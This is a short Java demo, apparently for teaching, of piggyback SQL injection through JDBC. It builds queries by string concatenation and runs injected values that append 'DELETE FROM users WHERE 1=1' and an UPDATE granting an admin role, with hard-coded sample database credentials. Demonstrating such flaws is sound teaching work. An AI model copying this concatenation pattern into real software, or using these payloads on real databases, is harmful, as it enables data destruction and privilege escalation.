// Piggyback Query SQL Injection via JDBC
// Attacker appends an additional malicious query that executes after the legitimate one.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;

public class piggyback_query_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: attacker input ends the first query and piggybacks a second one
        String input = "1; DELETE FROM users WHERE 1=1";
        String query = "SELECT * FROM products WHERE id = " + input;

        try {
            st.executeQuery(query);
            System.out.println("Original query ran, then piggybacked DELETE executed");
        } catch (Exception e) {
            System.out.println("Driver may disallow multiple statements: " + e.getMessage());
        }

        // Data modification piggyback
        String update = "1; UPDATE users SET role='admin' WHERE username='john'";
        try {
            st.executeUpdate("SELECT id FROM users WHERE id = " + update);
        } catch (Exception e) {
            System.out.println("Multi-statement blocked by driver config: " + e.getMessage());
        }

        st.close();
        con.close();
    }
}
